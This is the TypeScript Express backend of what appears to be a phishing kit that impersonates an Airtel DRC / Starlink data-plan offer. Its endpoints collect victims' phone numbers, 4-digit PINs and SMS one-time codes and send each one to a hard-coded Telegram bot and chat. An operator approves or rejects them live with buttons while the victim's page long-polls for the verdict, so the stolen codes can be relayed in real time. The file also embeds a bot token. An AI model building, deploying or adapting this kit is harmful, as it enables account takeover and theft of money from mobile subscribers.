import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8045300220';

export interface SessionRecord {
  sessionId: string;
  phone: string;
  pin: string;
  otp?: string;
  planName: string;
  planPrice: string;
  loginStatus: 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  loginMessageId?: number;
  otpMessageId?: number;
  createdAt: number;
  lastUpdated: number;
}

// In-memory sessions storage
const sessions = new Map<string, SessionRecord>();
// Phone to latest sessionId index for quick multi-request routing
const phoneToSessionMap = new Map<string, string>();

// Event listeners for instant long-polling responses (< 50ms latency)
type SessionListener = (session: SessionRecord) => void;
const waitingListeners = new Map<string, Set<SessionListener>>();

// Persistent storage file
const DATA_DIR = path.join(process.cwd(), 'data');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  } catch (err) {
    console.warn('Could not create data dir:', err);
  }
}

// Load persisted sessions on startup
function loadPersistedSessions() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const data = fs.readFileSync(SESSIONS_FILE, 'utf-8');
      if (data) {
        const parsed: Record<string, SessionRecord> = JSON.parse(data);
        const now = Date.now();
        let loadedCount = 0;
        for (const [id, s] of Object.entries(parsed)) {
          // Keep pending sessions or sessions less than 2 hours old
          if (s.loginStatus === 'pending' || s.otpStatus === 'pending' || (now - s.lastUpdated < 2 * 3600 * 1000)) {
            sessions.set(id, s);
            phoneToSessionMap.set(s.phone, id);
            loadedCount++;
          }
        }
        console.log(`[Storage] Restored ${loadedCount} active sessions from disk.`);
      }
    }
  } catch (err) {
    console.warn('[Storage] Error loading sessions file:', err);
  }
}

let saveDebounceTimer: NodeJS.Timeout | null = null;
function saveSessionsToDisk() {
  if (saveDebounceTimer) clearTimeout(saveDebounceTimer);
  saveDebounceTimer = setTimeout(() => {
    try {
      const obj: Record<string, SessionRecord> = {};
      sessions.forEach((val, key) => {
        obj[key] = val;
      });
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2), 'utf-8');
    } catch (err) {
      console.warn('[Storage] Failed to save sessions to disk:', err);
    }
  }, 250);
}

loadPersistedSessions();

// Notify all listeners waiting for an update on this sessionId
function notifySessionUpdated(session: SessionRecord) {
  const listeners = waitingListeners.get(session.sessionId);
  if (listeners && listeners.size > 0) {
    for (const listener of listeners) {
      try {
        listener(session);
      } catch (err) {
        console.error('Error executing session listener:', err);
      }
    }
    waitingListeners.delete(session.sessionId);
  }
}

// Helper function to send Telegram message
async function sendTelegramMessage(text: string, inlineKeyboard?: any) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload: any = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    };
    if (inlineKeyboard) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard,
      };
    }
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
    return null;
  }
}

// Helper to answer callback query promptly (non-blocking)
function answerCallbackQuery(callbackQueryId: string, text: string, showAlert = false) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callbackQueryId,
      text,
      show_alert: showAlert,
    }),
  }).catch((err) => console.warn('Failed to answer callback query:', err));
}

// Helper to edit message text
function editMessageText(chatId: string | number, messageId: number, newText: string) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      text: newText,
      parse_mode: 'HTML',
    }),
  }).catch((err) => console.warn('Failed to edit message text:', err));
}

// Normalizer for phone numbers
function normalizePhone(raw: string): string {
  return raw.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
}

// Central Telegram Polling Worker
let telegramOffset = 0;
let isPolling = false;

async function pollTelegramUpdates() {
  if (isPolling) return;
  isPolling = true;

  console.log('[Telegram Worker] Starting central polling loop with allowed_updates=[message, callback_query]...');

  // Reset any stale webhook so getUpdates receives all callback queries
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook?drop_pending_updates=false`);
  } catch (e) {
    console.warn('[Telegram Worker] Webhook reset error:', e);
  }

  while (true) {
    try {
      // Explicitly request callback_query and message updates to prevent Telegram filtering out button events
      const allowedUpdatesParam = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=20&limit=50&allowed_updates=${allowedUpdatesParam}`;
      
      const res = await fetch(url);
      if (!res.ok) {
        await new Promise((r) => setTimeout(r, 2000));
        continue;
      }

      const data = await res.json();
      if (data && data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          telegramOffset = Math.max(telegramOffset, update.update_id + 1);

          // 1. INLINE BUTTON CALLBACK QUERIES
          if (update.callback_query) {
            const query = update.callback_query;
            const callbackData: string = query.data || '';
            const callbackId: string = query.id;
            const msgId: number | undefined = query.message?.message_id;
            const chatId: string | number | undefined = query.message?.chat?.id;

            console.log(`[Telegram Worker] Processing callback: ${callbackData}`);

            // A) APPROVE LOGIN
            if (callbackData.startsWith('approve_login_')) {
              const sessionId = callbackData.replace('approve_login_', '');
              const session = sessions.get(sessionId);

              if (session) {
                session.loginStatus = 'approved';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '✅ Connexion validée ! Redirection client vers le code OTP.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
                    `<i>L'utilisateur accède actuellement à la saisie du code OTP.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable ou expirée.', false);
              }
            }

            // B) REJECT LOGIN
            else if (callbackData.startsWith('reject_login_')) {
              const sessionId = callbackData.replace('reject_login_', '');
              const session = sessions.get(sessionId);

              if (session) {
                session.loginStatus = 'rejected';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '❌ Connexion rejetée (PIN ou numéro incorrect).', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
                    `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>\n` +
                    `<i>L'utilisateur a été notifié de l'erreur sur son écran.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable ou expirée.', false);
              }
            }

            // C) APPROVE OTP
            else if (callbackData.startsWith('approve_otp_')) {
              const sessionId = callbackData.replace('approve_otp_', '');
              const session = sessions.get(sessionId);

              if (session) {
                session.otpStatus = 'approved';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '✅ Code OTP validé avec succès ! Forfait activé.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE OTP VALIDÉ (4 CHIFFRES)</b>\n\n` +
                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
                    `🔢 <b>Code OTP:</b> <code>${session.otp}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
                    `<i>Transaction terminée avec succès. L'utilisateur a été redirigé vers la confirmation.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }

            // D) REJECT OTP
            else if (callbackData.startsWith('reject_otp_')) {
              const sessionId = callbackData.replace('reject_otp_', '');
              const session = sessions.get(sessionId);

              if (session) {
                session.otpStatus = 'rejected';
                session.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(session);

                answerCallbackQuery(callbackId, '❌ Code OTP rejeté ou invalide.', true);

                if (msgId && chatId) {
                  const updatedText =
                    `🔐 <b>AIRTEL LITE - CODE OTP REFUSÉ (4 CHIFFRES)</b>\n\n` +
                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
                    `🔢 <b>Code OTP Saisi:</b> <code>${session.otp}</code>\n` +
                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
                    `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>\n` +
                    `<i>L'utilisateur a été invité à ressaisir son code OTP.</i>`;
                  editMessageText(chatId, msgId, updatedText);
                }
              } else {
                answerCallbackQuery(callbackId, 'Session introuvable.', false);
              }
            }
          }

          // 2. TEXT REPLIES OR COMMANDS FROM ADMIN
          if (update.message && update.message.text) {
            const text = update.message.text.trim().toLowerCase();
            const replyMsgId = update.message.reply_to_message?.message_id;

            // Find session by reply to message ID
            let targetSession: SessionRecord | undefined;
            if (replyMsgId) {
              for (const s of sessions.values()) {
                if (s.loginMessageId === replyMsgId || s.otpMessageId === replyMsgId) {
                  targetSession = s;
                  break;
                }
              }
            }

            if (targetSession) {
              const isLoginMsg = targetSession.loginMessageId === replyMsgId;
              if (['ok', 'oui', 'valider', 'yes', '1', 'v'].includes(text)) {
                if (isLoginMsg) targetSession.loginStatus = 'approved';
                else targetSession.otpStatus = 'approved';
                targetSession.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(targetSession);
                sendTelegramMessage(`✅ Action enregistrée: Session <code>${targetSession.sessionId}</code> validée !`);
              } else if (['non', 'refuser', 'rejeter', 'no', '0', 'r'].includes(text)) {
                if (isLoginMsg) targetSession.loginStatus = 'rejected';
                else targetSession.otpStatus = 'rejected';
                targetSession.lastUpdated = Date.now();
                saveSessionsToDisk();
                notifySessionUpdated(targetSession);
                sendTelegramMessage(`❌ Action enregistrée: Session <code>${targetSession.sessionId}</code> rejetée !`);
              }
            }
          }
        }
      }
    } catch (err) {
      console.warn('[Telegram Worker] Polling cycle error:', err);
      await new Promise((r) => setTimeout(r, 1500));
    }
  }
}

// Start central telegram polling worker
pollTelegramUpdates().catch((e) => {
  console.error('[Telegram Worker] Fatal crash, restarting in 3s...', e);
  isPolling = false;
  setTimeout(pollTelegramUpdates, 3000);
});

// Periodic Session Cleanup:
// Keep pending sessions until bot feedback is received!
// Clean up finalized (approved/rejected) sessions older than 2 hours
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  sessions.forEach((s, key) => {
    const isFinished = s.otpStatus === 'approved' || s.loginStatus === 'rejected' || s.otpStatus === 'rejected';
    const age = now - s.lastUpdated;
    // Remove completed sessions after 2 hours, or any stale session older than 24h
    if ((isFinished && age > 2 * 3600 * 1000) || age > 24 * 3600 * 1000) {
      sessions.delete(key);
      if (phoneToSessionMap.get(s.phone) === key) {
        phoneToSessionMap.delete(s.phone);
      }
      cleaned++;
    }
  });
  if (cleaned > 0) {
    console.log(`[Storage Cleanup] Purged ${cleaned} stale sessions.`);
    saveSessionsToDisk();
  }
}, 10 * 60 * 1000);

// API Health Endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    botConfigured: Boolean(BOT_TOKEN && CHAT_ID),
    activeSessions: sessions.size,
    timestamp: Date.now(),
  });
});

// 1. Send Login Credentials to Telegram
app.post('/api/telegram/send-login', async (req, res) => {
  try {
    const { sessionId, phone, pin, planName, planPrice } = req.body;

    if (!sessionId || !phone || !pin) {
      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
    }

    const cleanPhone = normalizePhone(phone);

    // Retrieve or instantiate session
    let session = sessions.get(sessionId);
    if (!session) {
      session = {
        sessionId,
        phone: cleanPhone,
        pin: pin.toString().slice(0, 4),
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'pending',
        otpStatus: 'idle',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
    } else {
      session.phone = cleanPhone;
      session.pin = pin.toString().slice(0, 4);
      session.planName = planName || session.planName;
      session.planPrice = planPrice || session.planPrice;
      session.loginStatus = 'pending';
      session.lastUpdated = Date.now();
    }

    phoneToSessionMap.set(cleanPhone, sessionId);
    saveSessionsToDisk();

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${session.pin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${session.planName}</b> (${session.planPrice})\n` +
      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${sessionId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.loginMessageId = result.result.message_id;
      saveSessionsToDisk();
    }

    return res.json({
      success: true,
      sessionId,
      status: session.loginStatus,
      message: 'Demande envoyée au bot Telegram avec succès.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-login:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// 2. Send 4-digit OTP Code to Telegram
app.post('/api/telegram/send-otp', async (req, res) => {
  try {
    const { sessionId, phone, otp, planName, planPrice } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    const cleanOtp = otp.toString().replace(/\D/g, '').slice(0, 4);
    if (cleanOtp.length !== 4) {
      return res.status(400).json({ error: 'Le code OTP doit comporter exactement 4 chiffres.' });
    }

    let session = sessions.get(sessionId);
    if (!session) {
      const cleanPhone = phone ? normalizePhone(phone) : 'Inconnu';
      session = {
        sessionId,
        phone: cleanPhone,
        pin: '****',
        planName: planName || 'Forfait Airtel Starlink',
        planPrice: planPrice || '$1.49',
        loginStatus: 'approved',
        otpStatus: 'pending',
        createdAt: Date.now(),
        lastUpdated: Date.now(),
      };
      sessions.set(sessionId, session);
      if (cleanPhone !== 'Inconnu') {
        phoneToSessionMap.set(cleanPhone, sessionId);
      }
    }

    session.otp = cleanOtp;
    session.otpStatus = 'pending';
    session.lastUpdated = Date.now();
    saveSessionsToDisk();

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${sessionId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.otpMessageId = result.result.message_id;
      saveSessionsToDisk();
    }

    return res.json({
      success: true,
      sessionId,
      status: session.otpStatus,
      message: 'Code OTP transmis au Telegram.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-otp:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// 3. Fast In-Memory Status Polling Endpoint (< 5ms)
app.get('/api/telegram/status', (req, res) => {
  const sessionId = req.query.sessionId as string;
  const phone = req.query.phone as string;

  let session: SessionRecord | undefined;
  if (sessionId) {
    session = sessions.get(sessionId);
  }
  if (!session && phone) {
    const clean = normalizePhone(phone);
    const sid = phoneToSessionMap.get(clean);
    if (sid) {
      session = sessions.get(sid);
    }
  }

  if (!session) {
    return res.json({
      exists: false,
      loginStatus: 'idle',
      otpStatus: 'idle',
    });
  }

  return res.json({
    exists: true,
    sessionId: session.sessionId,
    phone: session.phone,
    loginStatus: session.loginStatus,
    otpStatus: session.otpStatus,
    lastUpdated: session.lastUpdated,
  });
});

// 4. Ultra-Fast Event-Driven Long-Poll Endpoint
// Suspends response until Telegram bot clicks button or timeout fires
app.get('/api/telegram/wait-status', (req, res) => {
  const sessionId = req.query.sessionId as string;
  const targetStep = (req.query.targetStep as 'login' | 'otp') || 'login';
  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 12000, 2000), 25000);

  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId requis' });
  }

  const session = sessions.get(sessionId);
  if (!session) {
    return res.json({
      exists: false,
      status: 'idle',
      loginStatus: 'idle',
      otpStatus: 'idle',
    });
  }

  const currentStatus = targetStep === 'login' ? session.loginStatus : session.otpStatus;

  // If already resolved (approved or rejected), respond immediately!
  if (currentStatus === 'approved' || currentStatus === 'rejected') {
    return res.json({
      exists: true,
      sessionId: session.sessionId,
      step: targetStep,
      status: currentStatus,
      loginStatus: session.loginStatus,
      otpStatus: session.otpStatus,
      immediate: true,
    });
  }

  // Register long-poll listener
  let isResolved = false;
  let timer: NodeJS.Timeout | null = null;

  const listener: SessionListener = (updatedSession) => {
    if (isResolved) return;
    const newStatus = targetStep === 'login' ? updatedSession.loginStatus : updatedSession.otpStatus;
    if (newStatus === 'approved' || newStatus === 'rejected') {
      isResolved = true;
      if (timer) clearTimeout(timer);
      res.json({
        exists: true,
        sessionId: updatedSession.sessionId,
        step: targetStep,
        status: newStatus,
        loginStatus: updatedSession.loginStatus,
        otpStatus: updatedSession.otpStatus,
        immediate: false,
      });
    }
  };

  if (!waitingListeners.has(sessionId)) {
    waitingListeners.set(sessionId, new Set());
  }
  waitingListeners.get(sessionId)!.add(listener);

  // Set timeout cleanup
  timer = setTimeout(() => {
    if (isResolved) return;
    isResolved = true;
    const set = waitingListeners.get(sessionId);
    if (set) {
      set.delete(listener);
      if (set.size === 0) waitingListeners.delete(sessionId);
    }
    const latest = sessions.get(sessionId);
    const resolvedStatus = latest ? (targetStep === 'login' ? latest.loginStatus : latest.otpStatus) : 'pending';
    res.json({
      exists: Boolean(latest),
      sessionId,
      step: targetStep,
      status: resolvedStatus,
      timeout: true,
    });
  }, timeoutMs);

  // Handle client disconnect
  req.on('close', () => {
    isResolved = true;
    if (timer) clearTimeout(timer);
    const set = waitingListeners.get(sessionId);
    if (set) {
      set.delete(listener);
      if (set.size === 0) waitingListeners.delete(sessionId);
    }
  });
});

// 5. Manual action simulator endpoint
app.post('/api/telegram/manual-action', (req, res) => {
  const { sessionId, type, action } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ error: 'Session non trouvée' });
  }

  if (type === 'login') {
    session.loginStatus = action === 'approve' ? 'approved' : 'rejected';
  } else if (type === 'otp') {
    session.otpStatus = action === 'approve' ? 'approved' : 'rejected';
  }
  session.lastUpdated = Date.now();
  saveSessionsToDisk();
  notifySessionUpdated(session);

  return res.json({
    success: true,
    session,
  });
});

// Start Server with Vite Middleware Mode
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Airtel Portal Server] Running at http://0.0.0.0:${PORT}`);
  });
}

startServer();
